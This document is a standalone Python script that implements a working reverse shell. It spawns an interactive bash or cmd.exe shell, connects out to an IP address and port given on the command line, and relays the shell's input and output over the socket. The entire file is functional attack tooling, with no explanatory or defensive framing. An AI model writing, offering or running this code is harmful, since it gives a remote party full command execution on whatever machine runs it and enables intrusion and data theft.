import sys, platform
import socket, select, time
import os, threading
import subprocess as sp

if sys.version_info.major < 3:
    print("need python3 to run")
    exit(0)

if len(sys.argv) != 3:
    print("invalid argument", sys.argv)
    exit(0)

print("OS is", platform.system())
ip = sys.argv[1]
port = int(sys.argv[2])
print("IP=", ip, ", ", "port=", port)

cmd_arr = ["bash", "-i"]
if platform.system() == "Windows":
    cmd_arr = ["cmd.exe"]

p = sp.Popen(cmd_arr, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

try:
    s.connect((ip, port))
except:
    print("failed to connect")
    exit(0)

print("connected")
s.settimeout(None)
s.send("hello message from client!!!!\n".encode())


def stdout_thread():
    while True:
        o = os.read(p.stdout.fileno(), 1024)
        s.send(o)


threading.Thread(target=stdout_thread, daemon=True).start()


def stdin_thread():
    while True:
        i = s.recv(1024)
        os.write(p.stdin.fileno(), i)


threading.Thread(target=stdin_thread).start()
